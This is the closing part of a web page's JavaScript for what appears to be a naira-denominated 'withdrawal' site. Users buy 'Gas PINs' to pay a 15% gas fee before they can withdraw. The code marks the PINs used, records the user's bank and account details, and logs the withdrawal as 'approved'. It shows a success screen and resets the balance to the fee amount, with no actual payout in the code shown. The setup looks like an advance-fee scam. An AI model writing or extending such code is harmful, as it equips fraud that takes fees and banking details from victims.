  }

  const pinValue = pinData.amount || 0;

  if (pinValue <= 0) {
    alert("❌ Invalid Gas PIN value.");
    return;
  }

  // Add to total gas paid
  gasPaidTotal += pinValue;

  // Mark PIN as used
  await update(ref(db, "gasPins/" + pin), {
    used: true,
    usedBy: currentUser,
    usedAt: Date.now()
  });

  // Save progress
  saveProgress();

  const remaining = gasRequired - gasPaidTotal;

  if (remaining <= 0) {
    // Gas fully paid!
    alert("✅ Gas payment complete! Processing your withdrawal...");
    gasModal.style.display = "none";
    gasPin.value = "";
    
    // Complete withdrawal
    await completeWithdrawal();
  } else {
    // Partial payment
    alert(`✅ Gas payment of ₦${pinValue.toLocaleString()} received!\n\nRemaining: ₦${remaining.toLocaleString()}\n\nYou can pay the rest now or later.`);
    
    gasPin.value = "";
    updateUI();
    
    document.getElementById('modalGasPaid').innerText = gasPaidTotal.toLocaleString();
    document.getElementById('modalGasRemaining').innerText = remaining.toLocaleString();
  }
}

/* COMPLETE WITHDRAWAL */
async function completeWithdrawal() {
  try {
    const newBalance = gasRequired; // The 15% gas fee becomes the new balance
    
    // Update user's main balance to the gas fee amount
    await update(ref(db, "users/" + currentUser), {
      mainBalance: newBalance,
      legacyMigrated: true,
      migratedAt: Date.now()
    });

    // Save withdrawal transaction
    await push(ref(db, "withdrawals/" + currentUser), {
      amount: mainBalance,
      bank: withdrawalData.bank,
      accountNumber: withdrawalData.account,
      accountName: withdrawalData.accountName,
      gasPaid: gasRequired,
      newBalance: newBalance,
      timestamp: Date.now(),
      status: "approved"
    });

    // Clear localStorage
    localStorage.removeItem(`withdrawal_gas_${currentUser}`);

    // Show success modal
    document.getElementById('successWithdrawn').innerText = mainBalance.toLocaleString();
    document.getElementById('successNewBalance').innerText = newBalance.toLocaleString();
    document.getElementById('successBank').innerText = withdrawalData.bank + " - " + withdrawalData.account;
    
    successModal.style.display = "flex";
    
  } catch (error) {
    alert("❌ Error processing withdrawal: " + error.message);
  }
}

/* SAVE PROGRESS TO LOCALSTORAGE */
function saveProgress() {
  const storageKey = `withdrawal_gas_${currentUser}`;
  localStorage.setItem(storageKey, JSON.stringify({
    gasPaidTotal,
    withdrawalData,
    timestamp: Date.now()
  }));
}

/* CLOSE GAS MODAL */
window.closeGasModal = function() {
  gasModal.style.display = "none";
  gasPin.value = "";
}

/* LOGOUT FUNCTION */
window.logout = function() {
  if (confirm("Are you sure you want to logout?")) {
    // Clear session
    localStorage.removeItem('nairachain_current_user');
    
    // Reload page
    location.reload();
  }
}

/* CLOSE MODAL ON OUTSIDE CLICK */
gasModal.addEventListener('click', function(e) {
  if (e.target === gasModal) {
    closeGasModal();
  }
});

/* REMOVED OLD FEED CODE - NOW IN NAVBAR */

</script>
</body>
</html>
